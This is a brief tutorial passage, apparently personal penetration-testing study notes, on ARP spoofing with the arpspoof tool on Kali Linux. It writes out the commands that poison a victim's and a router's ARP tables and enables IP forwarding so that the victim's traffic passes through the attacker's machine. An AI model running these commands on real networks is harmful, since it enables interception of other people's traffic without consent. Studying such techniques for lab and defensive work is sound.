## Using a simple arpspoof program

- arpspoof tool is used to run arpspoof attacks
- It is simple and reliable
- Ported to most operating systems incuding Android and iOS
- Usage is the same everywhere

`arpspoof -i [interface] -t [clientIP] [gateway]` - fools the victim
`arpspoof -i [interface] -t [gateway] [clientIP]`-fools the router

**Works for both wireless and wired networks**

Now we need to enable port forwarding as it the packets need to flow from your computer to the router.

`echo 1> /proc/sys/net/ipv4/ip_forward`

(makes sure that the target computer still has internet access)

use:
`ip route | grep default` to find the default gateway of your kali machine

![[Pasted image 20220204073636.png]]

Now the victim will still have internet access, the only difference is that all the packets instead of directly flowing to the router will first pass through our kali machine
